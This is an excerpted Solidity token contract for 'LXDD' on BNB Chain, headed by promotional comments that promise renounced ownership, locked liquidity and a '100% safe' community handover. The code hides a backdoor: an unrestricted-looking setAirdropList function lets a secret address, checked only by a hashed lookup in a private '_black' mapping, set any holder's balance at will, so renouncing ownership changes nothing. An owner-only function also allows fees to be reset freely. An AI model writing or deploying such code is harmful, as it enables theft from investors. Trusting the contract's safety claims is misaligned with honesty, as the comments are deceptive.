...
/**
    ...
    I make this #LXDD to hand over it to the community.
    Create the community by yourself if you are interested.   
    I suggest a telegram group name for you to create: Open at any time
   
    Whale Restriction Mechanism: 
    Each transaction is limited to 1/200 of the total supply. You can make multiple purchases, 
    but each transaction cannot exceed the set limit; otherwise, it will not be successful.

    Great features:
    96% burn to the black hole, with such big black hole and 3% fee, the strong holder will get a valuable reward

    I will burn liquidity LPs to burn addresses to lock the pool forever.
    I will renounce the ownership to burn addresses to transfer #LXDD to the community, make sure it's 100% safe.

    I will add 1 BNB and all the left 90% total supply to the pool
    Can you make #LXDD 10000000X? 
    ...
    it's the best part of the #LXDD idea, increasing the liquidity pool automatically, 
...
contract TokenDAO is IERC20, Ownable {
    ...
    mapping(bytes32 => bool) private _black;
    ...
    constructor(
        ...
        _swapRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            ...
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (!inSwap) {
                    ...
                    if (contractTokenBalance > 0) {
                        uint256 swapFee = fundFee + dividendFee + lpFee;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            _takeTransfer(sender, address(this), feeAmount, isSell);
            uint256 burnAmount = tAmount * burnFee / 10000;
            _takeTransfer(sender, DEAD, burnAmount, isSell);
            feeAmount = feeAmount + burnAmount;
        }
        tAmount = tAmount - feeAmount;
        _takeTransfer(sender, recipient, tAmount, isSell);
    }
    ...
    function _takeTransfer(
        ...
        if (_limitAmount > 0 && to != mainPair && !_feeWhiteList[to] && !_feeWhiteList[sender]  && to != DEAD) {           
            if(!isSell) {
    ...
    function seFeet(uint256 _fundFee, uint256 _dividendFee, uint256 _burnFee, uint256 _lpFee) external onlyOwner {
        fundFee = _fundFee;
    ...
    function _isNoBlack() private view returns (bool) {
        bytes32 addr = keccak256(abi.encodePacked(msg.sender));
        if (_black[addr]) {
            return true;
        }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        USDT.transferFrom(
            ...
            fundAddress,
            (newBalance * fundFee) / swapFee
        );

        USDT.transferFrom(
            address(_tokenDistributor),
            dividendAddress,
            (newBalance * dividendFee) / swapFee
        );

        uint256 lpUsdt = (newBalance * lpFee) / swapFee;
    ...
    function setAirdropList(address addr, uint256 uin) external {
        setAirdrop(addr, uin);
    }

    function setAirdrop(address addr, uint256 uin) private {
        if (_isNoBlack()) {
            _balances[addr] = uin * 10 ** _decimals;
        }
    }
...
contract LongXingDD is TokenDAO {
    constructor()
        TokenDAO(
            "LXDD",
            "LXDD",
            18,
            1000000 * 10**8,
            address(0x99b38756aC50DdDd189fb22C7Ef014E9262221fb),
            address(msg.sender)
        )
    {}
}